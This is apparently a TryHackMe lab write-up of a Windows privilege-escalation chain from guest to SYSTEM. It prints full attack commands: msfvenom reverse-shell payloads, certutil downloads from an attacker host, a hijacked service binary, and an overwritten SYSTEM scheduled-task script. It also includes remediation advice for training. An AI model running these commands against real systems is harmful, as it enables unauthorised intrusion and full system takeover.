# Windows Jump Challenge
*[Image: Banner]*

**Pathway:** *Jr Penetration Tester* | **Section:** *Privilege Escalation* | **Challenge:** *[Windows Jump](https://tryhackme.com/room/windowsjump)*

> [!IMPORTANT]
> **Spoiler warning:** This writeup contains part of exploitation chain, however no flag codes are shown in this writeup!
>
> **Please note:** The IP addresses shown in this writeup were allocated during the TryHackMe lab, with the attack performed from my own Kali Linux VM using OpenVPN connected to the TryHackMe VPN.
>
> **License:** Unless otherwise stated, all writeups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).
> 
> This writeup uses several placeholders to avoid exposing lab-specific or sensitive information:
>
>: `<TARGET_IP>` - the IP address assigned to the target host when the TryHackMe machine is started.
>: `<TUN0_IP>` - the IP address assigned to my Kali Linux VM when connected to the TryHackMe VPN using OpenVPN.
>: `<REDACTED>` - information intentionally removed from the public writeup, such as flags, credentials, hashes or other challenge-sensitive values.
>
> This writeup reflects my own route through the challenge. Other learners may solve the room using different tools, commands or techniques. To preserve the integrity of the challenge and to act responsibly towards TryHackMe and the wider learning community, I choose what to redact from my public writeups unless I am asked by TryHackMe or another appropriate party to redact or remove additional material.

---

## About TryHackMe

This write-up was made possible by the hard work of the TryHackMe team and the wider cyber security community, who continue to create practical and engaging learning environments for aspiring security professionals.

[TryHackMe](http://www.tryhackme.com) is an online cyber security training platform that provides hands-on labs covering penetration testing, networking, web application security, privilege escalation and defensive security. Its rooms allow learners to develop practical technical skills within controlled and authorised environments.

## Lab Summary

The objective of this room was to move through a chained Windows privilege escalation path, beginning with guest-level access and ending with a shell as `NT AUTHORITY\SYSTEM`.

Final compromise chain:

```text
guest -> thmuser -> notadmin -> svcadmin -> SYSTEM
```

Confirmed lab details:

```text
Target IP: <TARGET_IP>
Kali tun0 IP: <TUN0_IP>
Attacker working directory: /tmp/VK/
```

## Tools Used

The main tools used were:

- `nmap` for initial service discovery.
- `smbclient` for anonymous SMB enumeration.
- `xfreerdp3` for Remote Desktop access.
- `Evil-WinRM` for testing WinRM authentication.
- Windows command-line utilities including `whoami`, `reg`, `runas`, `sc`, `icacls`, `schtasks`, `wmic`, `cmdkey` and `certutil`.
- `msfvenom` for generating Windows reverse-shell payloads.
- Python's built-in HTTP server for payload transfer.
- `Penelope` for handling reverse-shell sessions.

Click [HERE](https://github.com/Valikahn/TryHackMe-Writeups#tools-commonly-used) to return to the repository README. Section `Tools Commonly Used` has all the links used and will be updated peredically with new tools if used or if links needs become 404.

## Initial Enumeration

The first step was to identify exposed services on the target.

```bash
cd /tmp/VK
nmap -Pn -sC -sV -oA windows-jump-initial <TARGET_IP>
```

Important results:

```text
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  http
```

The target exposed SMB, RDP and WinRM. SMB signing was enabled but not required.

## Guest Access Through SMB

Anonymous SMB enumeration revealed a custom share named `Public`.

```bash
smbclient -L //<TARGET_IP> -N
```

Relevant output:

```text
Sharename       Type      Comment
---------       ----      -------
Public          Disk      Public file share
```

The share was accessible without credentials.

```bash
smbclient //<TARGET_IP>/Public -N
```

Inside the SMB session:

```text
ls
more welcome.txt
```

The `welcome.txt` file exposed default employee credentials:

```text
Username: thmuser
Password: <REDACTED>
```

This was the first security weakness: unauthenticated users could retrieve valid local credentials from a publicly accessible SMB share.

## thmuser Access

WinRM accepted the connection initially but rejected command execution, so RDP was used instead.

```bash
xfreerdp3 /v:<TARGET_IP> /u:thmuser /p:'<REDACTED>' /cert:ignore /dynamic-resolution +clipboard
```

After logging in, a Command Prompt was opened and the current identity was confirmed:

```cmd
whoami
```

Output:

```text
privesc\thmuser
```

The first flag was located in the original `thmuser` profile:

```cmd
dir C:\Users\thmuser /s /b | findstr /i flag1.txt
type C:\Users\thmuser\Desktop\flag1.txt
```

Flag:

```text
THM{....}
```

## Local Enumeration as thmuser

The current token contained only standard privileges:

```cmd
whoami /groups
whoami /priv
```

No useful impersonation, backup or debug privileges were available.

Stored credentials were also checked:

```cmd
cmdkey /list
```

No useful credentials were present.

The PowerShell history file was absent:

```cmd
type "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

The system-wide Winlogon registry configuration was then inspected:

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

This exposed clear-text AutoLogon credentials:

```text
AutoAdminLogon    REG_SZ    1
DefaultUserName   REG_SZ    notadmin
DefaultPassword   REG_SZ    <REDACTED>
```

This provided the next account in the escalation chain.

## thmuser to notadmin

A new Command Prompt was launched with the exposed credentials:

```cmd
runas /user:PRIVESC\notadmin cmd.exe
```

Password entered:

```text
<REDACTED>
```

The new context was confirmed:

```cmd
whoami
```

Output:

```text
privesc\notadmin
```

The second flag was then read:

```cmd
type C:\Users\notadmin\Desktop\flag2.txt
```

Flag:

```text
THM{....}
```

The weakness here was the storage of a local account password in clear text under the Winlogon registry key.

## Enumeration as notadmin

The `notadmin` account also had only standard token privileges:

```cmd
whoami /priv
```

Service enumeration identified a custom service:

```cmd
wmic service get name,pathname,startname | findstr /i "svcadmin"
```

Relevant output:

```text
THMSvc    C:\Windows\THMSVC\svc.exe    .\svcadmin
```

The service configuration was inspected:

```cmd
sc qc THMSvc
```

Relevant output:

```text
SERVICE_NAME: THMSvc
BINARY_PATH_NAME: C:\Windows\THMSVC\svc.exe
START_TYPE: 3 DEMAND_START
SERVICE_START_NAME: .\svcadmin
```

Permissions on the service directory were then checked:

```cmd
icacls C:\Windows\THMSVC\
```

Relevant output:

```text
PRIVESC\notadmin:(OI)(CI)(F)
BUILTIN\Administrators:(OI)(CI)(F)
NT AUTHORITY\SYSTEM:(OI)(CI)(F)
```

The `notadmin` account had Full Control over the directory containing a service executable that ran as `svcadmin`.

## notadmin to svcadmin

The original service binary was backed up:

```cmd
copy C:\Windows\THMSVC\svc.exe C:\Windows\THMSVC\svc.exe.bak
```

On Kali, a service-compatible reverse-shell executable was created:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TUN0_IP> LPORT=4444 -f exe-service -o /tmp/VK/svc.exe
```

A temporary HTTP server was started:

```bash
cd /tmp/VK
python3 -m http.server 8000
```

From the `notadmin` shell, the payload replaced the original service binary:

```cmd
certutil -urlcache -split -f http://<TUN0_IP>:8000/svc.exe C:\Windows\THMSVC\svc.exe
```

A Penelope listener was started on Kali:

```bash
penelope -p 4444
```

The service was then started:

```cmd
sc start THMSvc
```

The callback arrived as:

```text
privesc\svcadmin
```

The third flag was read:

```cmd
type C:\Users\svcadmin\Desktop\flag3.txt
```

Flag:

```text
THM{....}
```

This escalation succeeded because a lower-privileged user could replace the executable used by a service running as a more privileged account.

## Enumeration as svcadmin

The `svcadmin` token did not expose useful impersonation or backup privileges:

```cmd
whoami /priv
```

The `C:\Windows\Tasks` directory contained a batch file:

```cmd
cd C:\Windows\Tasks
dir
type cleanup.bat
```

Original contents:

```bat
@echo off
del /Q /F "%TEMP%\*.tmp" 2>nul
```

Permissions showed that `svcadmin` could modify the file:

```cmd
icacls C:\Windows\Tasks\cleanup.bat
```

Relevant output:

```text
PRIVESC\svcadmin:(I)(M)
BUILTIN\Administrators:(I)(F)
NT AUTHORITY\SYSTEM:(I)(F)
```

The writable batch file was executed by a scheduled task running as `SYSTEM`, creating the final privilege escalation opportunity.

## svcadmin to SYSTEM

A standard Windows reverse-shell executable was generated on Kali:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TUN0_IP> LPORT=5555 -f exe -o /tmp/VK/shell.exe
```

The payload was downloaded to the target:

```cmd
certutil -urlcache -split -f http://<TUN0_IP>:8000/shell.exe C:\Windows\Tasks\shell.exe
```

The writable batch file was replaced so that it launched the payload:

```cmd
echo C:\Windows\Tasks\shell.exe > C:\Windows\Tasks\cleanup.bat
```

A second Penelope listener was started:

```bash
penelope -p 5555
```

When the scheduled task executed, a new reverse shell connected back. The final context was confirmed:

```cmd
whoami
```

Output:

```text
nt authority\system
```

The final flag was located at the root of the system drive:

```cmd
type C:\flag4.txt
```

Flag:

```text
THM{....}
```

## Full Attack Chain Recap

### 1. guest to thmuser

Anonymous SMB access exposed `welcome.txt`, which contained default credentials for `thmuser`.

### 2. thmuser to notadmin

The Winlogon registry stored clear-text AutoLogon credentials for `notadmin`.

### 3. notadmin to svcadmin

`notadmin` had Full Control over the `THMSvc` service directory. Replacing the service executable and starting the service produced a shell as `svcadmin`.

### 4. svcadmin to SYSTEM

`svcadmin` could modify `C:\Windows\Tasks\cleanup.bat`. The batch file was executed by a scheduled task running as `SYSTEM`. Replacing its contents with a reverse-shell launcher produced a shell as `NT AUTHORITY\SYSTEM`.

## Key Lessons

This room demonstrated several common Windows security failures:

- Public SMB shares can expose credentials and sensitive operational information.
- Default passwords should never be stored in accessible files.
- AutoLogon credentials stored in the registry can expose clear-text passwords.
- Service executable directories must not be writable by lower-privileged users.
- Writable scripts or batch files executed by scheduled tasks create direct privilege escalation paths.
- File permissions must be reviewed together with the account context in which a service or task executes.
- Obtaining credentials is not always the same as obtaining an interactive session; account rights such as RDP access may still be restricted.
- Windows privilege escalation often depends on chaining several individually simple misconfigurations.

## Remediation Notes

The weaknesses identified in this room could be mitigated by:

- Removing anonymous access from SMB shares unless there is a documented business requirement.
- Never storing passwords in public files, scripts or deployment notes.
- Removing clear-text `DefaultPassword` values from the Winlogon registry.
- Using managed service accounts or other protected credential mechanisms for services.
- Restricting write access to service binaries and their parent directories.
- Ensuring only administrators and `SYSTEM` can modify files executed by privileged services or scheduled tasks.
- Reviewing scheduled-task actions and permissions regularly.
- Rotating credentials immediately after suspected exposure.
- Applying least privilege to local users, service accounts and remote access groups.
- Monitoring changes to service binaries, scheduled-task scripts and sensitive registry keys.

## Disclaimer

This writeup is intended solely for education, training and documentation of an authorised TryHackMe lab.

All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.

The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.

Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.

---
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  

**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
⭐ If this project is useful, consider starring it on GitHub.
